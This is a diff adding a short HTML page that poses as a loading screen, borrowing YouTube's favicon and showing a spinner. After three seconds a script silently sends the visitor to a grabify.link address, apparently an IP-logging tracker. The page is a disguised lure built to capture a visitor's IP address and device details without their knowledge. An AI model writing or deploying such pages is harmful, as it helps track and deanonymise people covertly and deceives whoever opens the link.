@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/jpeg" href="https://www.youtube.com/favicon.ico">
+
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #ffffff;
+    }
+
+    .loader {
+      width: 60px;
+      height: 60px;
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #4285F4;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+
+  <script>
+    setTimeout(function() {
+      window.location.href = "https://grabify.link/NCONIF";
+    }, 3000); // 3 seconds
+  </script>
+
+</head>
+
+<body>
+  <div class="loader"></div>
+</body>
+</html>
